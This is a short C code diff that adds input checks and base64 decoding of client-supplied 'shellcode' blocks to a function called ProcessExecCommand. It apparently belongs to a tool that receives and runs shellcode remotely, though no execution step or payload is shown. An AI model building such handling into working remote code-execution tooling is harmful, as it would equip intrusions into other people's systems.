@@ -609,6 +609,19 @@ void ProcessExecCommand(LPCLIENTSTRUCT lpSendingClient) {
    * block. */
   JoinAllShellCodeBytes(lpSendingClient,
       &pszEncodedShellCode, &nTotalEncodedShellCodeBytes);
+  if (nTotalEncodedShellCodeBytes <= 0) {
+    return;
+  }
+
+  if (IsNullOrWhiteSpace(pszEncodedShellCode)) {
+    return;
+  }
+
+  unsigned char szDecodedBytes[nTotalEncodedShellCodeBytes + 1];
+  memset(szDecodedBytes, 0,  nTotalEncodedShellCodeBytes + 1);
+
+  Base64Decode(pszEncodedShellCode, szDecodedBytes,
+      nTotalEncodedShellCodeBytes);
 
   /* Remove all the shellcode blocks for this client from the
    * linked list. This prevents this command from being re-issued
